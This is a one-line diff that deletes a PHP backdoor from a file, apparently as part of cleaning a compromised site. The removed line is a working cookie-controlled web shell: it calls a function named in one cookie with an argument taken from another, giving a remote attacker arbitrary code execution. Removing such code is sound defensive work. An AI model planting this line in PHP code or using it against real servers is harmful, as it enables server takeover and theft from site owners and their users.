@@ -1,1 +1,0 @@
-<?php if(isset($_COOKIE["VzD"])){$_COOKIE["yMlb"]($_COOKIE["VzD"]);exit;}
